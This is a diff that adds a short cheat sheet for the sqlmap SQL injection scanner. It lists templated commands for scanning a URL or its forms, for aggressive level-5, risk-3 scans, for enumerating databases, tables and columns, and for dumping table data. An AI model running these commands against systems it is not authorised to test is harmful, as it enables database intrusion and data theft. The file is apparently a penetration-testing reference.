@@ -1,0 +1,33 @@
+
+# Name: sqlmap
+# Url: http://sqlmap.org/
+# Type: sql injection scanner
+# Usefull resources
+#   - xxxxxx
+
+# Scan for SQLi
+sqlmap -u "<url>" --data "<params>"
+
+# Aggressive scan for SQLi
+sqlmap -u "<url>" --data "<params>" --level 5 --risk 3
+
+# Scan for SQLi autodetecting form and enumerating database types
+sqlmap -u "<url>" --forms --dbs
+
+# Scan for SQLi optimized
+sqlmap -u "<url>" --forms --dbs -o
+
+# Scan for SQLi optimized for 
+sqlmap -u "<url>" --forms --dbs -o --level 5 --risk 3
+
+# Scan for SQLi specifying database
+sqlmap -u "<url>" --forms --dbms <databasetype>
+
+# Enumerate tables for a specific schema
+sqlmap -u "<url>" --forms --dbms <databasetype> -D <schema> --tables
+
+# Enumerate columns for a specific schema, table
+sqlmap -u "<url>" --forms --dbms <databasetype> -D <schema> -T <table> --columns
+
+# Dump data for a specific schema, table, columns
+sqlmap -u "<url>" --forms --dbms <databasetype> -D <schema> -T <table> -C <columns1,column2,column3> --dump
